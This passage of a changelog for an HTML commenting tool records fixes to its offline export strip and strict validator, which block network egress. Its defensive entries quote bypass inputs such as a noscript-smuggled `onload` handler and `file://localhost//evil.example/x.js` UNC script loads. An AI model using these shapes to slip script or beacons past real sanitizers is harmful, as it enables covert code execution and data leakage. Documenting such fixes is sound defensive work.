  input, and the arm is now recorded as what it is: a false-positive reducer, not a security
  boundary.
  This REPLACES the anchor-driven cursor scan added in 1.699.0: that change made the same
  character-window decision cheap, and tokenizing the declaration removes the window (and so
  the cursors, their head patterns and their tests) outright, at a comparable cost per
  character.

## [1.701.0] - 2026-08-05

### Fixed

- Sorting a table nested inside another sortable table now re-applies every sortable ancestor's
  persisted sort, nearest first. An outer table sorted on a column whose cells HOLD a nested table
  ranks its rows by that cell's text, so a reader who sorted the outer table FIRST and the nested
  one second was left looking at an order ranked against the nested table's old rows - one that a
  reload (which replays the persisted sorts innermost-first) and an export never reproduced. Each
  ancestor is unsorted before it is re-sorted, matching the replay's authored-order starting point,
  so the live view is exactly what a reload gives back for either click order. Clearing a nested
  sort re-ranks its ancestors too, and because re-ranking an ancestor detaches and re-inserts the
  row that holds the clicked table, focus is restored to the chevron the reader actuated instead of
  being dropped on the document body (CMH-CONTENT-08).

## [1.699.0] - 2026-08-05

### Changed

- The offline navigation predicate's LOCAL-BINDING half is now an anchored scan rather than a
  `search()` over the whole script, cutting its per-character cost by an order of magnitude
  (CMH-OFFLINE-05). It decides whether an inline script declares its own `location` - which drops
  the navigation verdict to the PREFIXED sinks - and two of its arms carried a bounded
  400-character lookahead window, so every `const{` / `var[` / `function(` anchor in the text
  re-walked that window. Growth was already LINEAR, so this was not the ReDoS class earlier
  releases closed; the defect was the size of the CONSTANT. Densely packed declaration anchors
  measured ~2.2us per character in Python on `const{` repeated (0.031s at 12 KB, 0.375s at 120 KB,
  2.7s at 1.2 MB) and ~3.4us on `var[`, with ~0.33-0.52us in node - an order above the anchored
  sink scan beside it, on input that is document-supplied and includes the vendored payload's
  INFLATED bytes, where a few hundred base64 bytes buy megabytes. Every shape the pattern
  recognized ends in the literal `location`, so the scan is driven from THAT anchor, exactly as the
  sink search is, and every arm's HEAD is a forward-only cursor over the same text: the keyword and
  `catch` arms declare when a head ends exactly at the anchor, and the two windowed arms take the
  last head ending at or before it, whose final character is the opener. A cursor never re-reads a
  head it has already matched, and the unbounded whitespace run in `const<WS>location` is consumed
  once by the compiled head rather than walked backwards per anchor. The same inputs now cost
  ~0.26us and ~0.27us per character in Python and at most ~0.05us in node, the same order as the
  sink scan. The recognized language is unchanged, pinned in both directions and in BOTH engines
  against the frozen pattern over a crossed corpus plus a seeded fuzz, and the scaling guard grew
  four shapes - declaration-anchor density, name-anchor density, a single unbounded whitespace run,
  and densely stacked heads - so the constant is measured rather than left unstated.

## [1.696.0] - 2026-08-05

### Fixed

- An export whose canonical pass fails now says so instead of ending in silence. The pass that
  rewrites live comment offsets into authored-row coordinates ran on a bare line outside the
  try/catch that wraps the document build, so a throw there unwound the whole click handler: no
  file was downloaded and no message appeared, which a reader could not tell apart from a click
  that never registered. Save/Shareable, the NonShareable Standalone branch, and Offline now all
  run the pass through one guard that reports the failure as an assertive toast naming the cause,
  stating that no file was written and that the pass put comments and table sorting back. The
  report survives the awkward shapes a throw can take: a non-Error throwable (or one whose
  `message` getter itself throws) is still reported, and the cause is named whenever the thrown
  value can be turned into one; an unbounded message is capped so the actionable
  sentence stays on screen, the full value is left on the console for triage, and a toast that
  cannot be shown at all still aborts the export rather than restoring the original silence
  (CMH-EXP-23).

## [1.694.0] - 2026-08-05

### Fixed

- The validator's document parser now decides template inertness by NAMESPACE, not by tag name.
  Only the HTML `<template>` holds its contents in an inert DocumentFragment; an element merely
  NAMED `template` in the SVG or MathML namespace is an ordinary foreign element a browser keeps
  in the DOM and in its ancestor's `textContent`. Markup such as
  `<math><template>text</template></math>` inside `#commentRoot` was therefore invisible at once
  to the prose / unlinked-cross-reference view, the heading capture, the element view and the
  mermaid diagram-source view, and raw-text children written that way were recorded as parked
  rather than classified as they would be without that wrapper - so an SVG `<script>`/`<style>`,
  which a browser really does execute and apply, was hidden from the checks that read the live
  views. Such content is now validated exactly as a reader sees it, while a `<template>` under an
  HTML integration point such as `<svg><foreignObject>` or `<math><mi>`, or after a foreign
  breakout start tag, stays inert as before, and a declarative shadow root keeps rendering.

## [1.691.0] - 2026-08-05

### Added

- The in-document comment dialog can now DELETE the comment it is showing (CMH-CORE-22). Clicking a
  highlight's orange bubble opens the note with `Delete` beside `Close` and `Edit`, so removing a
  comment no longer means leaving the dialog and hunting down the same comment's card in the panel -
  the dialog already edits in place, and this is the missing half of that interaction. Deleting from
  the dialog is not a second implementation: both surfaces now call one shared path
  (`cmhConfirmDeleteThread`), so the confirmation wording (including the reply count that warns a
  thread root takes its replies with it), the durable embedded tombstone, the highlight removal, and
  the re-render are identical wherever the delete is started. Confirming closes the dialog, so
  nothing is left anchored to a removed highlight, and focus lands in the comments list instead of
  falling to the top of the page; declining leaves the dialog exactly as it was with focus back on
  `Delete`. `Delete` is offered in the note view only, so an in-place edit can never be discarded by
  a delete sitting next to it, and it carries the same accessible name the sidebar card's delete
  carries, so a thread root says up front that its replies go too.

## [1.689.0] - 2026-08-05

### Fixed

- The information-density advisory now drives the shared browser element-handler sequence and keeps
  its contribution frames parallel to the shared namespace stack. A self-closed foreign
  `<template/>` no longer opens an inert HTML fragment and suppresses every later density warning,
  markup inside an SVG `<title>` or `<script>` is parsed instead of swallowed as HTML raw text, and
  a slash on a non-void HTML start tag no longer makes the density pass close an element the shared
  parser leaves open. Same-name paragraph and heading closers inside an inert template also stay
  scoped to that fragment instead of finalizing live outer prose capture, and a paragraph nested
  inside inline `cm-skip` no longer finalizes the surrounding live paragraph (CMH-VAL-15).

## [1.688.0] - 2026-08-05

### Fixed

- A region marker a browser does not parse as a comment where the strip thinks it is can no longer
  aim an export's region strip (CMH-EXP-22). The marker locator is a LINE locator: it finds a
  marker-shaped line wherever it sits, including inside a `<script>`, `<textarea>` or `<title>`
  body, where a browser builds no comment at all. While the layer's own marker is intact a quoted
  one only makes the count 2 and the existing guard already refuses, so two shapes were reachable:
  a DAMAGED region whose only surviving marker was an authored quotation, and a REAL marker the
  locator cannot see (the legacy `--!>` close) standing beside a quotation it can. In both the
  Plain strip anchored on the quotation and cut from the real BEGIN through the author's content -
  36,791 characters of the shipped Shareable document, the whole COMMENT UI region included,
  downloaded as a "plain" copy with no error at all. Counting markers is not enough to catch the
  second shape, so the export now stamps each located marker with its own probe token in a copy of
  the source, parses that copy once, and requires every token to turn up inside a real comment;
  the token's stem is extended until it does not occur in the document at all, so a file that
  quotes a token cannot vouch for a marker that is not in a comment. The check is scoped to
  markers written in HTML-comment syntax, since the strips anchor on `<!--`: the
  Shareable CSS region's `/* ... */` pair inside a live `<style>` is unaffected, and a stray
  `/* END: ... */` in the body still reaches the existing region-attribution diagnosis instead of a
  cause that does not apply.
- A quoted region marker that shares its line with other markup no longer aims an export's
  region strip either (CMH-EXP-22). The strips' `<!--` prefix is not line-anchored, so an
  authored `<p>x</p><!-- BEGIN: commentable-html - JS -->` was invisible to the LINE locator -
  not counted, not a duplicate - and was still a perfectly good place for the strip to start,
  cutting from there through the real region. An anchor strictly BEFORE a region's own BEGIN is
  now refused; an anchor at the marker is the healthy case, and a missing one only leaves the
  region unstripped, which the existing data-safety net already diagnoses.
## [1.686.0] - 2026-08-05

### Changed

- Declarative shadow DOM is now an explicit, bounded authoring contract rather than markup the
  tools silently treat as an ordinary inert template. A supported root must be on a browser-eligible
  HTML host, carry `shadowrootserializable`, contain no light-DOM siblings or `<slot>` distribution,
  and be exported in a browser with `Element.getHTML`; the validator reports each unsupported shape
  instead of guessing at composed-tree behavior or allowing an export that loses closed-root data.

### Fixed

- The validator and table-of-contents generator no longer suppress rendered content inside the
  first declarative shadow root on a browser-eligible host. Both `shadowrootmode="open"` and
  `"closed"` now contribute prose and headings, including a report title rendered through a shadow
  root, while an ineligible host, a second declaration on the same host, and any declaration inside
  an outer ordinary template contribute nothing. Script/style bodies remain non-visible raw text.
  Shadow-tree metadata, ids, layer markers, links, charts, and mermaid blocks remain outside the
  document's light-DOM structural views.
- The runtime's template-aware walkers now record their shadow-DOM boundary explicitly. The
  infrastructure resolver still excludes shadow-root ids because `document.getElementById` cannot
  see them; Markdown and section review remain light-DOM-only because closed roots cannot be
  inspected and review anchors do not cross shadow boundaries. Save and export preserve supported
  open and closed roots through shadow-aware serialization; the validator requires
  `shadowrootserializable` and rejects mixed light/shadow children so every accepted document fits
  that durable model (slot distribution is rejected too, and shadow-DOM export requires a browser
  with `Element.getHTML`). Generated TOC entries target the outer light-DOM host because browser
  fragment navigation cannot target a heading inside a shadow tree.

## [1.685.3] - 2026-08-05

### Fixed

- Section review hashes now use the same browser-boundary parser as the validator and other
  authoring tools. Implicit paragraph/list-item closes, non-void HTML tags written with `/>`, and
  headings quoted inside raw-text or RCDATA elements therefore produce the same sections and
  hashes in Python and Chromium; RCDATA character references and the leading-LF rule still match
  DOM `textContent`, and an inert template cannot hide the live content root.
- The validator document parser and table-of-contents generator no longer treat `</body>` or
  `</html>` in the HTML namespace as closing an open content root. HTML5 changes insertion mode
  for those tags without popping the open elements, so trailing content stays inside the root
  exactly as it does in a browser; same-named foreign elements still close normally. The TOC
  parser also keeps foreign-template content live and never selects a duplicate root after the
  browser's first root is a void or self-closed foreign element.

## [1.685.2] - 2026-08-05

### Fixed

- The validator and upgrade tool now preserve raw newline characters while reading documents, so a
  lone carriage return cannot become a line break that makes Python count a region marker the
  browser runtime ignores. The validator compares marker counts in that raw view, then runs every
  browser-semantic check on the browser-normalized newline view, so equivalent CRLF/LF attribute
  values cannot evade duplicate checks. Upgrade offsets advance on line feeds only, retaining
  correct CRLF widths, and output still normalizes inserted regions to the document's dominant
  newline without doubling preserved CRLF sequences. Newline style alone no longer makes an
  up-to-date CRLF document look stale, and invalid UTF-8 now produces a clean read error instead of
  an upgrade traceback. Validation stamps also use and remove the document's dominant newline, so
  stamping a CRLF file cannot introduce a lone line feed or leave a blank line behind. Deck-theme
  validation preserves the same raw newlines in its temporary file instead of doubling CRLF on
  Windows.

## [1.685.0] - 2026-08-05

### Fixed

- A chrome control focused while the comments panel is still SLIDING IN no longer loses its tooltip
  for good (CMH-UI-14). The tip is only ever raised by `focusin`/`mouseover`, so a control that sat
  outside the visible box during the 0.22s panel slide was suppressed with no second chance - a
  keyboard user who opened the panel and immediately tabbed to Search, Sort, More or Help got
  silence. A suppressed control now opens a bounded watch episode: the tip is raised the moment the
  control lands (within 600ms), and the bubble then keeps following the control until its box holds
  still, so it ends up beside the settled control with its arrow on the control's centre rather than
  parked where the control was mid-slide. The suppression itself is unchanged for a control the
  reviewer genuinely cannot see (a soft keyboard covering it, a pinch-panned page): an episode needs
  the control to still be focused or hovered, is bounded as a whole so a never-settling animation
  cannot renew it, and ends when focus or the pointer moves on, on the usual dismissals (focus out,
  scroll, viewport change, Escape, mousedown), or when another control takes over - so it expires
  quietly instead of parking a bubble over unrelated chrome or raising one over a control the
  reviewer has already tabbed past.

## [1.684.0] - 2026-08-05

### Fixed

- Startup diagnostics now share one aggregation path and appear together in a single alert toast.
  A startup storage read or write failure, duplicate reserved data blocks, an unresolved
  review-state block, and the handled-comment cleanup notice can no longer replace one another
  before the reader sees them.

## [1.681.0] - 2026-08-04

### Changed

- The browser-accurate element-boundary SEQUENCE now lives in exactly one place (CMH-VAL-21).
  `handle_starttag()`, `handle_startendtag()` and `handle_endtag()` moved onto the shared
  `_BrowserBoundaries` base (and, identically, onto the degraded fallback a partial install gets)
  and drive overridable hooks - `_visit_start()`, `_push_element()`, `_visit_void()`,
  `_after_start()`, `_visit_self_closed()`, `_visit_end()` - so each of the thirteen parsers and
  authoring tools that derive from it now says only what it COLLECTS. The same ~25-line skeleton
  (browser tag name, browser attribute dict, child namespace, the implicit `</p>` / `</li>` close,
  the void and foreign self-closing carve-outs, the namespace push, the raw-text switch, and, for
  an end tag, the innermost open element then the truncation) was maintained in eleven independent
  copies, where one forgotten `_enter_raw_text()` would silently have parsed a `<script>` body as
  markup - the base deliberately disables the host's own `_enter_cdata_mode()`, so no gate would
  have seen it. A new guard fails any subclass that writes a tag handler of its own, with a single
  named exception (the prose-density pass, which keeps no namespace stack and applies no implicit
  close, so sharing the sequence would change what it counts rather than share it). No behavior
  change to any tool: every parse this refactor touches reads a document exactly as it did.

## [1.679.0] - 2026-08-04

### Fixed

- The Offline export no longer emits a `<noscript>` body whose end the two tokenizers disagree
  about - a file its own `--strict` gate rejects. A fallback body has two readings, and the export
  re-parses with only one: the `DOMParser` every strip walks has scripting OFF, so the body is
  markup, while the reviewer who opens the exported file has scripting ON, so it is raw text that
  ends at the first `</noscript`. The two agree exactly while the serialized body carries no such
  end-tag-open, and disagree the moment it does, because everything past that seam is live markup to
  the reviewer while the strips never saw it. Measured in chromium, two shapes really did ride an
  export out as a live `on*` handler, both because the serializer writes them verbatim: a comment
  (`<noscript><!-- </noscript><img onload=...> --></noscript>`) and a raw-text `<style>` child. The
  seam cannot be reconciled from the exporter, since escaping it would change what a
  scripting-disabled reader is shown, so such a body is dropped whole and the count is named in the
  export toast rather than being silent content loss. The predicate reads the SERIALIZED body rather
  than modelling which node types a serializer writes verbatim, so it also catches an attribute-value
  seam on an engine that predates the escaping of `<` and `>` inside an attribute value (Chrome 116,
  Firefox 118, Safari 17) - an export runs in whatever browser the reviewer opened the document with.
  An ordinary fallback - the layer's own print fallback included - reads the same both ways and is
  preserved, an `<svg><noscript>` is an ordinary foreign element and is never judged at all, and
  Shareable is untouched, since it makes no zero-network promise and preserves the author's bytes by
  design.
- The Offline export no longer ACTIVATES fallback content it was only supposed to carry: the chart
  hoist moved a `Chart`-mentioning `<script>` parked inside a `<noscript>` into the body so it would
  run after the inlined library. Such a script is a real element to the scripting-disabled parse the
  export walks, but inert TEXT to the reader, so hoisting it did not relocate author code - it
  started executing code the source document never ran. The hoist now skips any script with an HTML
  `<noscript>` ancestor; the chart evidence scan is unchanged, where a false positive only costs
  bytes.
- Known bound, tracked as issue #1081: all of the above concerns a `<noscript>` in the BODY. A
  `<noscript>` in the HEAD has its body promoted out of the fallback by `DOMParser` itself (the "in
  head noscript" insertion mode allows only `link`, `style`, `meta`, comments and whitespace), before
  any pass can see it, so a script parked there still rides out as live head content. Closing that
  needs a pre-parse, source-string pass, since a promoted node is indistinguishable in the DOM from
  an authored head sibling.

## [1.678.0] - 2026-08-04

### Fixed

- A `file:` reference that hides a UNC authority behind a `localhost` label, a dot segment, or an
  empty path segment is no longer blessed as local by the offline strip or the strict gate
  (CMH-OFFLINE-04). The rule the whole `file:` arm now keeps is CANONICALIZATION STABILITY: a value
  and the href the URL parser canonicalizes it to must get the SAME verdict. Three shapes broke it,
  and none is reachable by a test that reads only the START of a value, because the parser's path
  state runs AFTER the host is emptied.
  - `file://localhost//evil.example/x.js` empties the host and keeps `//evil.example/x.js` as the
    PATH, so it canonicalizes to `file:////evil.example/x.js` - the four-separator UNC form this
    same predicate already calls an off-machine SMB load on Windows - yet the exclusion's terminator
    accepted ANY `/` after the host, so both implementations agreed it was a local file. The
    terminator now accepts the end of the value, a `?` or `#`, or a SINGLE path slash, which also
    covers the backslash spelling `file://localhost/\evil.example/x.js` (the URL cleanup maps `\`
    onto `/`).
  - A DOUBLE-DOT segment pops the segment before it, including the very label an exclusion just
    matched: `file:////localhost/../evil.example/x` and `file:////C:/../x.js` canonicalize onto the
    four-separator form with a different leading label. A `..` anywhere in the path now makes the
    arm match REGARDLESS of the `localhost` and drive-letter exclusions, in every spelling the
    parser treats as a double-dot segment (`..`, `.%2e`, `%2e.`, `%2e%2e`, case-insensitively).
  - An EMPTY path segment IS that four-separator form, and it arrives from values the separator
    arms never look at: `file:///.//x.js` and `file:/a/..//x.js` both canonicalize to
    `file:////x.js` from a three-slash or slash-less value. It now has an arm of its own that
    ignores the leading separator count entirely and reads only a `//` in the PATH.

  A fuzz of 421,560 values against a real URL parser measured the result at this revision: ZERO
  remain where the predicate says local while the value's own canonical form is egress. The cost is
  over-detection in the safe direction, pinned in the corpus rather than left implicit -
  `file://localhost//C:/x.js` (canonically the LOCAL `file:////C:/x.js`),
  `file://localhost/a/../b.js`, a bare `file://localhost//`, and an authored `file:///C:/a//b.png`
  are all now reported, while `file://localhost/a/./b.js`, `file:///C:/local/x.js` and
  `file://localhost/x.js?q//h` stay local.
- The `file:` egress predicate now excludes `localhost` in every PERCENT-ENCODED and CASE spelling,
  instead of testing the literal nine characters (CMH-OFFLINE-04). A file host is percent-decoded
  and lowercased through domain-to-ASCII BEFORE the file-host state turns the exact string
  `localhost` into the empty host, so `file://local%68ost/x` parses to `file:///x` in a real WHATWG
  parser - the same purely local file as `file://localhost/x`. The literal test called it egress,
  which is the SAFE direction (nothing leaks; both implementations agreed, so there was no
  exporter/validator drift) but costs content: the offline strip deleted the author's reference and
  `validate.py --strict` then rejected a file with no egress at all. Both sides now spell the host
  one alternation per character, with BOTH hex rows per letter, because a `/i` regex folds `%6c`
  onto `%6C` but never onto `%4c` and `%4c` decodes to `L`. The same tolerance is right for the
  four-or-more-separator arm, where there is no host to decode: that arm's UNC name comes out of the
  PATH, and a real Chromium was MEASURED percent-decoding a `file:` path before it touches the
  filesystem. The widening cannot smuggle a host past either side: only a host that decodes to
  exactly `localhost` matches, and `%2F` / `%00` are forbidden host code points that fail to parse
  outright. All 4096 encode/case spellings of the host were cross-checked against a real URL parser.
- A TRAILING DOT stays egress, and that boundary is now stated rather than left implicit. The
  file-host state special-cases the exact string `localhost` and `localhost.` is not it, so
  `file://localhost./x` keeps a NON-EMPTY host and on Windows resolves to the SMB path
  `\\localhost.\x` - egress even though it lands on the loopback, exactly as the scheme-relative
  `\\localhost\C$\x` already is. So this is the parser-faithful reading, not an accepted
  over-detection, and the parity corpus now carries the trailing-dot, percent-encoded-dot and
  starts-with-`localhost` spellings with their expected verdicts so neither implementation can
  drift across the boundary on its own.

### Changed

- The IDNA/UTS-46 half of host canonicalization is now recorded as an ACCEPTED, deliberate
  over-detection rather than left unstated: `file://<U+FF4C>ocalhost/x`, its percent-encoded UTF-8
  `file://%EF%BD%8Cocalhost/x`, `file://LOCALHO<U+017F>T/x` and the soft-hyphen
  `file://local%C2%ADhost/x` all parse to href `file:///x` (measured) and are still reported as
  egress. UTS-46 mapping cannot be written as a regex both engines agree on, and Python's
  `re.IGNORECASE` folds `s` onto U+017F where a JS `/i` never does, so attempting it is how the two
  drift; over-detecting costs a rare reference while under-detecting is a beacon the gate blesses.
  The corpus pins those spellings so the boundary cannot move on one side only.
- The two implementations' shared `localhost` sub-patterns are now pinned BYTE-for-byte to each
  other by a text-equality parity assertion, not only by matching verdicts over the corpus - a
  corpus cannot see a drift on a spelling it does not carry, and a nine-character alternation has
  far more spellings than any corpus can list.
### Changed


## [1.677.0] - 2026-08-04

### Changed

- The scheme boundary of the offline strip's and the strict validator's network-URL predicates is
  now EVIDENCE rather than an unexplained omission (CMH-OFFLINE-04). Both recognize an http/https
  authority, a scheme-relative one and an explicit `file:` host, and both read every other
  authority-bearing scheme - `ftp:`, `ws:`, `wss:`, `filesystem:`, and a custom scheme with no
  registered handler - as local. That was checked in a real Chromium rather than argued from the
  URL standard, whose `special scheme` set is wider than what a browser will fetch: from a `file:`
  document, raw TCP listeners behind every attribute and CSS load channel the strip covers recorded
  connections for http and https and NONE for any of the others (`net::ERR_UNKNOWN_URL_SCHEME` for
  `ftp:`, `ws:`, `wss:`, `gopher:` and a custom scheme - Chromium removed FTP support in 88 - and
  `Not allowed to load local resource` for `filesystem:`). So neither predicate is widened: doing so
  would buy no egress protection while making the exporter DELETE an author's reference and the gate
  reject a file with no egress in it. The controls are PER CHANNEL rather than aggregate, because an
  aggregate control is satisfied by the first image and lets a channel that is dead by construction
  hand every candidate a free zero - which the first draft did, through an at-rule import written
  after a qualified rule, a `source` element beside a media `src`, and `background` on a `div`.
  Five limits of the evidence are recorded rather than implied: a scripted `WebSocket` does reach
  the network in `ws:`/`wss:` and is closed by the export's `connect-src 'none'`; a REGISTERED
  protocol handler (whether registered by a page or already installed on a reader's machine) is a
  different, unmeasurable-from-`file:` case; `preconnect`/`dns-prefetch` leak a name rather than
  open a connection, and one in a candidate scheme survives the link pass (#1076); a scheme handed
  to an external application is not a network load at all; and the measurement is Chromium's, with
  nothing claimed for other engines and `ftp:` named as the row to re-measure first. What protects a
  file already on disk is not this predicate but the zero-network CSP the export bakes into it, so
  `offline-clean` means no automatic browser egress under the strip and that policy together rather
  than the absence of every authority-shaped token. The shared parity corpus now carries these
  schemes with their expected verdicts on BOTH sides, so a future widening has to move the exporter
  and the gate together instead of drifting.

### Fixed

- The exported file's `connect-src 'none'` is now pinned by a live measurement instead of a
  substring check on the policy text (CMH-OFFLINE-04, CMH-OFFLINE-05). A scripted `WebSocket` is
  the one network channel no attribute predicate can see, so the decision not to widen `ws:`/`wss:`
  rests entirely on that directive - and a policy that still spelled `'none'` beside another source
  would have passed the old substring assertion while the channel silently reopened. The exported
  file is now driven against a raw TCP listener in both directions: blocked with the policy, and
  connecting once the policy is removed, which is what makes the zero a measurement.

## [1.674.0] - 2026-08-04

### Fixed

- An `<iframe srcdoc>` no longer rides through an Offline export, or past `validate.py --strict`
  in offline mode, carrying a whole nested document (CMH-OFFLINE-04, CMH-OFFLINE-05). A `srcdoc`
  holds an entire document as an ATTRIBUTE VALUE, and neither side of the offline contract could
  see inside it: the exporter's `_stripOfflineNetworkLoads` cleared an iframe's `src` and left
  `srcdoc` untouched, and every walk it makes visits ELEMENTS, so nothing descends into the
  string; the strict validator's offline resource check read `("iframe", ("src",))` only, and its
  tag index tokenizes the document, so that nested markup was attribute text and never became
  tags. An inline event handler, a meta refresh, or a network loader parked inside one therefore
  travelled into a file that promises zero network AND was certified clean by the gate the export
  is measured by. The offline CSP does not close the channel either: `frame-src 'none'` blocks a
  `src` LOAD, but a `srcdoc` frame is content the policy is INHERITED into rather than a fetch,
  and the inherited policy still allows inline script, which can navigate the top-level document.
  The direction chosen - the way the meta-refresh case was settled - is that an offline document
  may not carry `srcdoc` at all: the export now clears the attribute UNCONDITIONALLY (on presence,
  so an empty or inert one goes too, which is what stops the gate blessing a file an export would
  still change) and offline `--strict` rejects any that remains, so the two sides agree by
  construction rather than by keeping two independent nested-document parsers in step. The frame
  ELEMENT is kept - an author's `title`, sizing and relative `src` are content - and the removal
  is counted in the export toast, because unlike a network strip this takes away content that
  worked offline. Both sides judge the same shapes: a `<template>`-parked frame, a `<noscript>`
  fallback and a self-closed foreign element, namespace-blind.

## [1.671.0] - 2026-08-04

### Fixed

- The print appendix no longer moves the document content hash, and no longer treats an author's
  element as its own. `beforeprint` materializes every open comment as real prose at the end of
  `#commentRoot`, so for as long as a print preview was open the hash - and with it the validated
  banner and every section review badge - reflected the REVIEWER's notes rather than the document.
  Runtime-injected chrome is now excluded from the hash scan by IDENTITY (`CMH_HASH_EXCLUDED`, a set kept separate from the heuristic export-tail set so an over-capture there can never subtract document text)
  rather than by a class: the appendix cannot wear `cm-skip`, because the print stylesheet hides
  `body > .cm-skip` and a document with no `#commentRoot` roots the layer at `<body>`, which would
  hide the appendix from the very print it exists for. The appendix is also resolved by identity
  instead of `getElementById`, so an author element that happens to carry `id="cmhPrintComments"`
  is no longer overwritten on print, deleted afterwards (or immediately, when the document has no
  comments), or counted as reviewer chrome in the hash - the same rule as CMH-CORE-21.

### Changed

- Audited every runtime DOM mutation inside the content root for the stranded-authored-text class
  behind the table-sort bug, and gave the fix behind it a single shared home (CMH-CONTENT-21).
  Appending elements instead of permuting them through the slots they already occupy strands the
  whitespace text nodes an author leaves between them, which silently drifts the document and
  section content hashes and falsely raises the "not validated" banner. The audit checked the
  draggable widget/triage board, checklist control injection, editable notes, deck mode, the
  table-scroll wrapper and the code-line gutter against `window.__cmhReview.docHash()` and found
  all six text-neutral; the one intentional exception is a widget card MOVE on a board that is not
  `cm-skip`, where the arrangement IS the content, and `Reset moves` now has a test proving it
  restores the load hash exactly. The slot math itself moved into one place -
  `cmhPermuteChildrenInSlots` (writer) and `cmhPermutedChildNodes` (pure reader) in the
  preamble - with the table sorter and the canonical-hash scan rewired onto them, so the class
  cannot reappear in a third copy. A catch-all test loads every shipped example document and
  compares its live hash to the Python hash of the file on disk, so a NEW stranding mutation is
  caught even with no case written for it.
- The persisted table-sort map is re-homed onto a null-prototype object like the checklist and
  notes state maps (CMH-SEC-02), so the runtime has one convention for a document-reachable state
  map rather than two. Its keys are `<idx>::<header-sig>`, so the prototype part is defense in
  depth; a non-map payload (an array) is now discarded rather than accepted, which used to eat the
  reader's sort silently because `JSON.stringify` drops string keys written onto an array.

## [1.670.0] - 2026-08-04

### Fixed

- Closed two egress shapes that neither the Offline export strip nor the strict validator looked at,
  so a document carrying either rode into a zero-network export and `--strict` certified it clean.
  Hyperlink auditing (`<a ping>` / `<area ping>`) POSTs to every URL the attribute names on every
  click; the export now removes the attribute through the same template-walking pass as the other
  load attributes, and the gate rejects one in an offline document. It goes whatever it names, the
  way a meta refresh does: a relative ping still POSTs, shows the reader nothing, and is meaningless
  in a single-file export, so accepting one would bless a file an export would change - and an
  unconditional rule is one the two sides cannot drift apart on. What counts as "names no URL" is
  read off HTML's own tokenization rather than off either engine's whitespace class - the list is
  split on ASCII whitespace ONLY - so an empty or ASCII-whitespace-only value is left untouched by
  both (the strip has no write path for it at all), while an NBSP or U+FEFF value, which a browser
  resolves as a relative target and POSTs to, is caught by both. Trimming instead would have drifted
  them in both directions, since `String.trim()` and Python's `str.strip()` disagree about exactly
  those characters. (CSP Level 3 folds auditing into
  `connect-src`, which the offline policy does set to `'none'`, so a current browser most likely
  absorbs it - but the strip and the gate are the layer that is not supposed to DEPEND on the CSP,
  and the directive's `ping-src` history makes that coverage version-dependent.) The SVG filter
  primitive `<feImage href>` / `xlink:href` fetches exactly like the SVG `<image>` and `<use>` the
  media list already covered, so it joins that list on both sides; a relative or `data:` reference
  is left untouched. One selector spelling reaches both namespaces - CSS compares a type selector
  case-sensitively for an SVG-namespaced element and case-insensitively for an HTML one, so
  `feImage` matches the SVG primitive and an `<feimage>` authored outside `<svg>` alike (a current
  Chromium is laxer still and matches any casing, which neither side relies on) - which keeps the
  strip namespace-blind, exactly as the validator's flat tokenizer is forced to be.

## [1.669.0] - 2026-08-04

### Fixed

- The offline validator's egress gate no longer switches itself off on a NonShareable-lineage
  offline document (CMH-VAL-08). `_check_self_contained` scoped every offline-only rule with
  `not nonshareable and mode == "offline"`, keying the GATE to a classification the exporter's
  offline STRIPS never consult: `saveOffline` reaches `_buildOfflineHtml` from the NonShareable
  path too (the standalone rebuild inlines the companion CSS/JS and removes the NONSHAREABLE
  BOOTSTRAP block first, and the descriptor is then stamped `offline`), so a document that
  DECLARES offline while still carrying a companion reference - which a mangled or missing
  CSS/JS region marker leaves behind, and a hand-authored file can carry outright - silently
  turned off the zero-network CSP requirement, the media/form/background egress checks, the
  inline-script navigation and import scans, the active-data (importmap/speculationrules) rules,
  and the event-handler and meta-refresh gates, all at once. Such a file was never certified
  clean - the descriptor rule rejects the NonShareable-plus-offline pair on its own, and did so
  before this change - so what was lost was the REPORT and the second layer, not the verdict: a
  live `on*` handler and a missing offline CSP were not named at all, and the egress that was
  named carried the shareable wording, so the list an author worked from was incomplete and the
  rest of it appeared only once the descriptor line had been corrected. The scope of a
  fail-closed gate should not depend on a different check happening to be right, which is the
  defense-in-depth this restores. That principle is applied where widening is free, not
  absolutely: a descriptor that is missing, unparseable, not an object, or carries a mode outside
  the allowed set still leaves `offline_mode` false and is caught by the descriptor rule alone,
  deliberately, because defaulting those to offline would add wrong `offline mode:` errors to an
  ordinary shareable document whose descriptor merely failed to parse - a worse report, for no
  verdict. The offline scope is now decided by the DECLARED descriptor
  mode alone, and the check no longer even receives the classification, so it cannot regress to
  consulting it. The gate was widened to match the strips rather than the exporter narrowed,
  because refusing an offline export on the NonShareable path would remove the only way a
  companion-file document becomes a single offline file. Nothing legitimate is newly rejected:
  the descriptor error and the offline errors are now reported together, and a document that
  declares `nonshareable` keeps its own rules unchanged - its companion `<link>`/`<script src>`
  stay ordinary local references, and the shipped bootstrap's `onclick` dismiss button still
  validates clean.

## [1.668.0] - 2026-08-04

### Fixed

- The offline validator's meta-refresh gate now reads its target with the SHARED network-URL
  predicate instead of a pattern of its own (CMH-VAL-08, CMH-OFFLINE-05). Offline mode already
  rejects every `<meta http-equiv="refresh">` whatever its target, so the target parser only
  decides WHICH message the rejection carries - the one that names a beacon, or the generic one -
  and a bespoke copy that only picks a message is exactly the code nobody re-widens when the
  shared predicate moves. It had already drifted in both directions: it read exactly two leading
  separators, so the four-or-more-separator `file:////host` the attribute gate counts (an
  empty-host file URL whose UNC-shaped path Chromium on Windows was measured resolving off the
  machine, which is why the separator arithmetic is empirical and is not "two or more") was
  reported as local, and so was every slash run of three or more, which the shared `/{2,}` arm
  counts deliberately - what `///host` resolves to depends on the base (that host from a document
  served over http/https, an empty-host local path from a `file:` one), so counting it is the
  fail-closed reading and costs only wording here. In the other direction a Windows DRIVE LETTER -
  which the file-host state turns into a path, so it reaches no host at all - was named a network
  beacon that does not exist. The target now goes through `normalize_url_value` and
  `is_network_url`, so the separator arithmetic, the `localhost` and drive-letter exclusions, the
  empty-authority rule and the backslash spellings are all inherited from the one predicate the
  rest of the egress gates read, and one predicate cannot drift from itself. Exporter/validator
  agreement is unchanged in both directions, since the export removes every refresh regardless.

## [1.667.0] - 2026-08-04

### Changed

- Documented the identifier escape in the offline navigation sink chain as a deliberate residual of
  the strip, in BOTH of its directions, rather than leaving the CMH-OFFLINE-05 residual list
  understating it. A UnicodeEscapeSequence that decodes to a legal identifier character may appear
  inside an IdentifierName and names exactly the same property, so an escape in ANY identifier of
  the chain and at any position in it - a prefix name, the sink name, or the
  `href`/`assign`/`replace` after it, in either the `\u006E` or the `\u{6E}` form
